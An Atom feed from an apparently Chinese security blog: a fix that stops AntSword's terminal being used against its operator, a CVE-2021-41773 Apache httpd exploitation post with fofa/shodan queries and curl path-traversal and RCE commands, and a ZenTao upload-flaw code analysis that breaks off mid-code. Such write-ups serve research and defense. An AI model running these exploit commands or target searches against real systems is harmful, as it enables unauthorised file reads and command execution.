<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>h3art3ars</title>
  
  <subtitle>路漫漫其修远兮，吾将上下而求索</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://h3art3ars.github.io/"/>
  <updated>2022-05-24T14:39:47.481Z</updated>
  <id>http://h3art3ars.github.io/</id>
  
  <author>
    <name>h3art3ars</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>防蚁剑反制配置</title>
    <link href="http://h3art3ars.github.io/2022/04/14/%E9%98%B2%E8%9A%81%E5%89%91%E5%8F%8D%E5%88%B6%E9%85%8D%E7%BD%AE/"/>
    <id>http://h3art3ars.github.io/2022/04/14/%E9%98%B2%E8%9A%81%E5%89%91%E5%8F%8D%E5%88%B6%E9%85%8D%E7%BD%AE/</id>
    <published>2022-04-14T05:05:47.000Z</published>
    <updated>2022-05-24T14:39:47.481Z</updated>
    
    <content type="html"><![CDATA[<h1 id="防蚁剑反制配置"><a href="#防蚁剑反制配置" class="headerlink" title="防蚁剑反制配置"></a>防蚁剑反制配置</h1><h2 id="反制蚁剑文章"><a href="#反制蚁剑文章" class="headerlink" title="反制蚁剑文章"></a>反制蚁剑文章</h2><ul><li><p><a href="https://mp.weixin.qq.com/s/WNv9nPWvKudwimtYTd1zDQ" target="_blank" rel="noopener">端内钓鱼，反制蚁剑</a></p><p>分析蚁剑连接时的流量特征，通过测试连接性，最后在终端报错出url，并点击，让受害者点击然后上线cs。</p></li><li><p><a href="https://www.freebuf.com/articles/web/292724.html" target="_blank" rel="noopener">关于蚁剑反制深入的分析和利用</a></p><p>分析蚁剑连接时的流量特征， 读取文件和目录都没有问题，常见的命令执行没有问题，但是上传下载显示连通性出现问题 ，在终端报错出url，让受害者点击上线cs。</p></li></ul><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>antsword的虚拟终端采用的是<a href="">jquery.terminal</a>,版本为1.1.1。css与js文件 在 <code>antSword-master\static\libs\terminal</code>目录。在遇到链接和电子邮件时会自动将其转换成a标签。点击链接后,antsword会用自身的浏览器模块加载恶意js文件。</p><p><img src="/images/image-20220414131505475.png" alt="生成a标签"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>最新版本的 jquery.terminal已经修复了自动将终端的链接和邮件地址转换成a标签，但是antsword的js不向上兼容，只能手动修改js代码。</p><p>打开  <code>antSword-master/static/libs/terminal/js/jquery.terminal-min-1.1.1.js</code></p><p><img src="/images/image-20220414131547000.png" alt="convertlinks配置代码"></p><p>寻找 <code>convertLinks:true</code> 字段 ，将自动转换配置改为 <code>convertLinks:false</code>。重启antsword后的命令行终端就不会自动将链接转换为a标签了。</p><p><img src="/images/image-20220414131632680.png" alt="修改配置后"></p><p>而且最新版的antsword好像修复了，点击链接会调用浏览器打开而不是antsword自身的浏览器模块。</p>]]></content>
    
    <summary type="html">
    
      防止通过蚁剑被反制
    
    </summary>
    
    
      <category term="技巧" scheme="http://h3art3ars.github.io/categories/%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="技巧" scheme="http://h3art3ars.github.io/tags/%E6%8A%80%E5%B7%A7/"/>
    
      <category term="渗透" scheme="http://h3art3ars.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Apache HTTP Server漏洞利用</title>
    <link href="http://h3art3ars.github.io/2021/11/24/Apache-HTTP-Server%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://h3art3ars.github.io/2021/11/24/Apache-HTTP-Server%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2021-11-24T12:49:47.000Z</published>
    <updated>2022-05-24T14:36:31.761Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> Apache httpd Server 2.4.49 版本引入了一个具有路径穿越漏洞的新函数，但需要配合穿越的目录配置 Require all granted，攻击者可利用该漏洞实现路径穿越从而读取任意文件，或者在配置了cgi的httpd程序中执行bash指令，从而有机会控制服务器。 </p><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p><a href="https://www.anquanke.com/post/id/256973" target="_blank" rel="noopener">Apache httpd Server CVE-2021-41773 漏洞分析</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>fofa</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">app &#x3D; &quot;apache-server&#x2F;2.4.49&quot;</span></pre></td></tr></table></figure><p>shodan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">server: Apache&#x2F;2.4.49</span></pre></td></tr></table></figure><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="本地文件读取"><a href="#本地文件读取" class="headerlink" title="本地文件读取"></a>本地文件读取</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">curl -s --path-as-is <span class="string">"http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"</span></span></pre></td></tr></table></figure><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">curl -s --path-as-is -d &#39;echo Content-Type: text&#x2F;plain; echo; id&#39; &quot;http:&#x2F;&#x2F;localhost:8080&#x2F;cgi-bin&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;bin&#x2F;sh&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">curl -s --path-as-is &quot;http:&#x2F;&#x2F;localhost:8787&#x2F;cgi-bin&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd&quot;</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Apache HTTP Server漏洞利用
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞利用" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>禅道后台文件上传分析</title>
    <link href="http://h3art3ars.github.io/2020/10/29/%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90/"/>
    <id>http://h3art3ars.github.io/2020/10/29/%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90/</id>
    <published>2020-10-29T12:46:51.000Z</published>
    <updated>2020-10-29T12:49:35.311Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>官网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">禅道 项目管理软件 是国产的开源项目管理软件，专注研发项目管理，内置需求管理、任务管理、bug管理、缺陷管理、用例管理、计划发布等功能，实现了软件的完整生命周期管理。</span></pre></td></tr></table></figure><h1 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">CNVD-C-2020-121325</span></pre></td></tr></table></figure><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p> 禅道项目管理软件开源版 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">12.3.3</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">12.4.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">12.4.2</span></pre></td></tr></table></figure><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>禅道支持两种路由方式分别是 <code>GET</code> <code>PATH_INFO</code> 模式，可以在 <code>config/my.php</code> 文件配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$config-&gt;requestType     &#x3D; &#39;PATH_INFO&#39;; &#x2F;&#x2F; GET&#x2F;PATH_INFO&#x2F;PATH_INFO2</span></pre></td></tr></table></figure><p>其中按照源码搭建的默认是GET 方式，一键搭建的是PATH_INFO模式.</p><p>其中解析路由的方法，在index.php的parseRequest</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$app-&gt;parseRequest();  &#x2F;&#x2F;解析路由</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$common-&gt;checkPriv();&#x2F;&#x2F;检测权限</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$app-&gt;loadModule();&#x2F;&#x2F;加载模块</span></pre></td></tr></table></figure><p>先分析一下程序入口 index.php的重要内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;包含基础的类和函数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">include &#39;..&#x2F;framework&#x2F;router.class.php&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">include &#39;..&#x2F;framework&#x2F;control.class.php&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">include &#39;..&#x2F;framework&#x2F;model.class.php&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">include &#39;..&#x2F;framework&#x2F;helper.class.php&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;实例化 app</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">$app &#x3D; router::createApp(&#39;pms&#39;, dirname(dirname(__FILE__)), &#39;router&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">$common &#x3D; $app-&gt;loadCommon();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;此处访问 http:&#x2F;&#x2F;ip&#x2F;index.php?mode&#x3D;getconfig 可看出版本 可以作为一个小tips</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;mode&#39;]) and $_GET[&#39;mode&#39;] &#x3D;&#x3D; &#39;getconfig&#39;) die(helper::removeUTF8Bom($app-&gt;exportConfig()));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">$app-&gt;parseRequest();  &#x2F;&#x2F;解析路由</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">$common-&gt;checkPriv();&#x2F;&#x2F;检测权限</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">$app-&gt;loadModule();&#x2F;&#x2F;加载模块</span></pre></td></tr></table></figure><p>在实例化app的的时候，执行了router类的构造函数</p><p>其中在构造函数中执行了一个方法 <code>setSuperVars</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function setSuperVars()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;post    &#x3D; new super(&#39;post&#39;); </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;get     &#x3D; new super(&#39;get&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;server  &#x3D; new super(&#39;server&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;cookie  &#x3D; new super(&#39;cookie&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;session &#x3D; new super(&#39;session&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        unset($GLOBALS);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        unset($_REQUEST);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        &#x2F;* Change for CSRF. *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        if($this-&gt;config-&gt;framework-&gt;filterCSRF)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">            $httpType &#x3D; (isset($_SERVER[&quot;HTTPS&quot;]) &amp;&amp; $_SERVER[&quot;HTTPS&quot;] &#x3D;&#x3D; &#39;on&#39;) ? &#39;https&#39; : &#39;http&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">            $httpHost &#x3D; $_SERVER[&#39;HTTP_HOST&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">            if((!defined(&#39;RUN_MODE&#39;) or RUN_MODE !&#x3D; &#39;api&#39;) and strpos($this-&gt;server-&gt;http_referer, &quot;$httpType:&#x2F;&#x2F;$httpHost&quot;) !&#x3D;&#x3D; 0) $_FILES &#x3D; $_POST &#x3D; array();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        $_FILES  &#x3D; validater::filterFiles(); &#x2F;&#x2F;过滤 $_FILE</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">        $_POST   &#x3D; validater::filterSuper($_POST); &#x2F;&#x2F;过滤 $_POST</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        $_GET    &#x3D; validater::filterSuper($_GET);&#x2F;&#x2F;过滤 $_GET</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">        $_COOKIE &#x3D; validater::filterSuper($_COOKIE);&#x2F;&#x2F;过滤 $_COOKIE</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>可以看到在赋值的时候分别进行了过滤</p><p>$_FILE 检测是否匹配配置文件的文件后缀白名单</p><p>对 <code>$_GET,$_POST,$COOKIE</code>中的值进行以下的正则匹配以及xss过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">preg_match(&#39;&#x2F;[^a-zA-Z0-9_\.\-]&#x2F;&#39;, $key);</span></pre></td></tr></table></figure><p>因此在参数上限制的很严格，即使是PATH_INFO模式，在之后的代码中也会解析之后进行检测，如果不匹配正则</p><p>就会 <code>die(bad request)</code></p><p>接着跟进 <code>parseRequest</code>方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function parseRequest()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;&#x2F;&#x2F;检查配置文件的requestType值</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        if($this-&gt;config-&gt;requestType &#x3D;&#x3D; &#39;PATH_INFO&#39; or $this-&gt;config-&gt;requestType &#x3D;&#x3D; &#39;PATH_INFO2&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">            $this-&gt;parsePathInfo();         &#x2F;&#x2F;解析path_info参数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">            $this-&gt;setRouteByPathInfo();&#x2F;&#x2F;设置路由文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        elseif($this-&gt;config-&gt;requestType &#x3D;&#x3D; &#39;GET&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">            $this-&gt;parseGET();&#x2F;&#x2F;解析get参数 m&#x3D;model&amp;f&#x3D;method&amp;var1&#x3D;var&amp;var2&#x3D;var</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">            $this-&gt;setRouteByGET();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        else</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">            $this-&gt;triggerError(&quot;The request type &#123;$this-&gt;config-&gt;requestType&#125; not supported&quot;, __FILE__, __LINE__, $exit &#x3D; true);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>简单来说</p><p> PATH_INFO模式就是 <code>/module-method-var1-var2.html</code></p><p>GET模式就是    <code>?m=model&amp;f=method&amp;var1=var&amp;var2=var</code></p><p>接着进入checkPriv 方法检测权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function checkPriv()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        $module &#x3D; $this-&gt;app-&gt;getModuleName();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        $method &#x3D; $this-&gt;app-&gt;getMethodName();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        if($this-&gt;app-&gt;isFlow)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">            $module &#x3D; $this-&gt;app-&gt;rawModule;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">            $method &#x3D; $this-&gt;app-&gt;rawMethod;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        if(!empty($this-&gt;app-&gt;user-&gt;modifyPassword) and (($module !&#x3D; &#39;my&#39; or $method !&#x3D; &#39;changepassword&#39;) and ($module !&#x3D; &#39;user&#39; or $method !&#x3D; &#39;logout&#39;))) die(js::locate(helper::createLink(&#39;my&#39;, &#39;changepassword&#39;, &#39;&#39;, &#39;&#39;, true)));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        if($this-&gt;isOpenMethod($module, $method)) return true;  &#x2F;&#x2F;检测是否为开放模块</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        if(!$this-&gt;loadModel(&#39;user&#39;)-&gt;isLogon() and $this-&gt;server-&gt;php_auth_user) $this-&gt;user-&gt;identifyByPhpAuth();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        if(!$this-&gt;loadModel(&#39;user&#39;)-&gt;isLogon() and $this-&gt;cookie-&gt;za) $this-&gt;user-&gt;identifyByCookie();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        if(isset($this-&gt;app-&gt;user))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">            if(!defined(&#39;IN_UPGRADE&#39;)) $this-&gt;session-&gt;user-&gt;view &#x3D; $this-&gt;loadModel(&#39;user&#39;)-&gt;grantUserView();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">            $this-&gt;app-&gt;user &#x3D; $this-&gt;session-&gt;user;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            if(!commonModel::hasPriv($module, $method)) $this-&gt;deny($module, $method);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">        else</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">            $referer  &#x3D; helper::safe64Encode($this-&gt;app-&gt;getURI(true));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">            die(js::locate(helper::createLink(&#39;user&#39;, &#39;login&#39;, &quot;referer&#x3D;$referer&quot;)));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>跟进 <code>isOpenMethod</code>方法，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function isOpenMethod($module, $method)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">if($module &#x3D;&#x3D; &#39;entry&#39;  and $method &#x3D;&#x3D; &#39;visit&#39;) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;user&#39; and strpos(&#39;login|logout|deny|reset&#39;, $method) !&#x3D;&#x3D; false) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;api&#39;  and $method &#x3D;&#x3D; &#39;getsessionid&#39;) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;misc&#39; and $method &#x3D;&#x3D; &#39;checktable&#39;) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;misc&#39; and $method &#x3D;&#x3D; &#39;qrcode&#39;) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;misc&#39; and $method &#x3D;&#x3D; &#39;about&#39;) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;misc&#39; and $method &#x3D;&#x3D; &#39;checkupdate&#39;) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;misc&#39; and $method &#x3D;&#x3D; &#39;ping&#39;)  return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;sso&#39; and $method &#x3D;&#x3D; &#39;login&#39;)  return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;sso&#39; and $method &#x3D;&#x3D; &#39;logout&#39;) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;sso&#39; and $method &#x3D;&#x3D; &#39;bind&#39;) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;sso&#39; and $method &#x3D;&#x3D; &#39;gettodolist&#39;) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;block&#39; and $method &#x3D;&#x3D; &#39;main&#39; and isset($_GET[&#39;hash&#39;])) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        if($module &#x3D;&#x3D; &#39;file&#39; and $method &#x3D;&#x3D; &#39;read&#39;) return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        ...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        检测登录</span></pre></td></tr></table></figure><p>检测是否为这些开放模块，如果不是，就检查是否登录。</p><p>最后就是加载解析过的模块方法了。</p><p>分析了禅道的工作流程之后看一下本次的漏洞发生处。</p><p>在<code>module/client/control.php</code>的 <code>download</code>方法中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function download($version &#x3D; &#39;&#39;, $link &#x3D; &#39;&#39;, $os &#x3D; &#39;&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span 